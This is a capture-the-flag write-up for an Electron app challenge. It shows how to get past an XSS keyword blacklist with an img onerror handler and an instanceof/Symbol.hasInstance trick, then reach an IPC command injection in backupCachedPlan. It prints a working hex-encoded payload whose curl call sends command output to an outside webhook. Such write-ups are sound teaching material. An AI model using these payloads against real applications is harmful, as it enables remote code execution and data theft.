# Clientside

Challenge author: DJumanto

Electron RCE challenge.

1. XSS in the app  
    In the application, the way the developer inserts the ``description`` is not secure, which results in an XSS vulnerability within the application. However, there is fairly strict sanitization applied (apparently) to the description data.
    The sanitization used is:
    ```js
    const unnecessaryChar = "abbr acronym address applet area article aside audio base bdi bdo big blink blockquote br button canvas caption center cite code col colgroup command content data datalist dd del details dfn dialog dir div dl dt element em embed fieldset figcaption figure font footer form frame frameset head header hgroup hr html iframe image input kbd keygen label legend li link listing location main map mark marquee menu menuitem meta meter multicol nav nextid nobr noembed noframes noscript object optgroup output param picture plaintext pre progress samp script section select shadow slot small source spacer span strike strong sub . summary sup svg table tbody td template textarea tfoot th thead time tr track tt ul var video replace eval ( ) `".split(" ")
    ```
    Luckly <img> is not blacklisted 🤣
    ```js
    const escapeRegExp = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    for (const c of unnecessaryChar) {
        const pattern = new RegExp(escapeRegExp(c), 'gi');
        description = description.replace(pattern, '');
    }
    ```

However, we can still invoke JavaScript functions without parentheses using the following format:
```js
args instanceof { [Symbol['hasInstance']]: Object['functionName'] }
```

2. Web prefference settings
    - Node integration: ``False``
    - Context Isolation: ``true``
    This means that we cannot directly invoke Node.js functions from the browser context, even if an XSS vulnerability exists.

3. RCE via Unsafe IPC Handler in main process
    Ada 3 IPC handler di main.ts:
    ```js
    planCached.then(planCache => {
        ipcMain.handle('set-cached-plans', (_, plan: PlanInterface) =>{
            planCache.setCachedPlan(plan);
            mainWindow.webContents.send('plan-updated');
        });
        ipcMain.handle('get-cached-plans', _ => {
            return planCache.getCachedPlans();
        });
        ipcMain.handle('backup-cached-plans', (_, name: string) => {
            return planCache.backupCachedPlan(name);
        });
    });
    ```

    The implementation of backupCachedPlan contains a command injection vulnerability, specifically in PlanCached.ts:
    ```js
    backupCachedPlan(name: string){
        let command = '';
        switch (process.platform){
            case 'win32':
                command=`powershell -Command "Compress-Archive -Path ${this.path} -DestinationPath ${name}.zip"`;
                exec(command);
                break;
            case 'darwin':
                command=`zip -r ${this.path} ${name}.zip`;
                exec(command);
                break;
            case 'linux':
                command=`zip ${name}.zip ${this.path}`;
                exec(command);
                break;
            default:
                break;
        }
    }
    ```
    As a result, it is possible for us to inject a payload into it by invoking ``window.api.backupCachedPlan``. However, since the dot (.) character is blacklisted, we can replace it by using [] (``window['api']['backupCachedPlan']``) and invoke the arguments using the previously mentioned technique, below is the command we use:
    ```sh
    gedagedi; curl http://webhook/?c=$(./readflag)
    ```
    As a result, the final payload that can be used to obtain the flag is:
    ```js
    <img src=x onerror="'\x62\x61\x64\x2e\x7a\x69\x70\x20\x61\x3b\x20\x63\x75\x72\x6c\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x2e\x73\x69\x74\x65\x2f\x32\x65\x35\x62\x30\x33\x62\x66\x2d\x37\x38\x62\x62\x2d\x34\x33\x35\x34\x2d\x39\x66\x66\x38\x2d\x36\x65\x66\x37\x61\x33\x30\x62\x30\x32\x37\x62\x3f\x63\x3d\x24\x28\x2f\x72\x65\x61\x64\x66\x6c\x61\x67\x29\x20\x23' instanceof { [Symbol['hasInstance']]: window['api']['backupCachedPlan'] }">
    ```

# Ref
- [Invoke JS function without Parantheses](https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses)